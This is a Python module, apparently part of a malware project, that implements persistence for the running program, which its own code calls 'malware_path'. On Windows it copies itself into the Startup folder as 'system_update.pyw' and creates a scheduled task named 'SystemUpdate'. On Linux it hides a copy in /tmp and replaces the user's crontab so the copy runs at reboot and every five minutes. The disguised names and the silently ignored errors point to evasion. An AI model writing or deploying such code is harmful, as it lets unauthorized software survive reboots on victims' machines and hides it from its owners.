# services/persistence.py
import os
import sys
import platform
import subprocess
from pathlib import Path

class PersistenceManager:
    def __init__(self):
        self.system = platform.system()
        self.malware_path = sys.argv[0]

    def install(self) -> bool:
        if self.system == "Windows":
            return self._install_windows()
        elif self.system == "Linux":
            return self._install_linux()
        return False

    def _install_windows(self):
        try:
            target = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "system_update.pyw"
            import shutil
            shutil.copy2(self.malware_path, target)
            # Tâche planifiée
            subprocess.run(
                f'schtasks /create /tn "SystemUpdate" /tr "python {target}" /sc onstart /delay 0001:00 /f',
                shell=True, capture_output=True, timeout=10
            )
            return True
        except:
            return False

    def _install_linux(self):
        try:
            target = Path("/tmp/.system_update")
            import shutil
            shutil.copy2(self.malware_path, target)
            os.chmod(target, 0o755)
            # Cron
            with open("/tmp/cron_temp", "w") as f:
                f.write(f"@reboot python3 {target}\n*/5 * * * * python3 {target}\n")
            subprocess.run(["crontab", "/tmp/cron_temp"], capture_output=True)
            return True
        except:
            return False